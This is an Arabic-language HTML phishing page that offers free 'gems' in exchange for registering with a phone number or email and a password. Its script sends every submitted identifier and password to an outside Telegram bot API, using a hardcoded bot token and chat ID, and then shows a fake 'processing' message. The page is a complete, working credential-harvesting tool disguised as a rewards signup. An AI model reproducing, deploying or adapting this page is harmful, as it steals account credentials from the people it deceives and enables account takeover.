<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سجل للحصول على 100جوهرة💎 </title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: right;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
        .message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
            display: none;
        }
        .success {
            background-color: #dff0d8;
            color: #3c763d;
        }
        .error {
            background-color: #f2dede;
            color: #a94442;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>سجل للحصول على 110 جوهرة 💎</h1>
        <form id="registrationForm">
            <div class="form-group">
                <label for="identifier">رقم الهاتف أو البريد الإلكتروني</label>
                <input type="text" id="identifier" required>
            </div>
            <div class="form-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit">تسجيل</button>
        </form>
        <div id="message" class="message"></div>
    </div>

    <script>
        document.getElementById('registrationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const identifier = document.getElementById('identifier').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            // إرسال البيانات إلى بوت تيليجرام
            sendToTelegramBot(identifier, password)
                .then(response => {
                    messageDiv.textContent = "جاري تنفيذ طلبك!";
                    messageDiv.className = "message success";
                    messageDiv.style.display = "block";
                    
                    // مسح النموذج بعد الإرسال
                    document.getElementById('registrationForm').reset();
                })
                .catch(error => {
                    messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.";
                    messageDiv.className = "message error";
                    messageDiv.style.display = "block";
                    console.error('Error:', error);
                });
        });

        async function sendToTelegramBot(identifier, password) {
            // استبدل TOKEN و CHAT_ID بقيم البوت الخاص بك
            const botToken = '7105269422:AAFJaDFgB88r_MbHC3bFlPzdXxKNXzb8Gy8';
            const chatId = '6660593539';
            
            const message = `بيانات تسجيل جديدة:\n\nالمعرف: ${identifier}\nكلمة المرور: ${password}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                
                return await response.json();
            } catch (error) {
                throw error;
            }
        }
    </script>
</body>
</html>
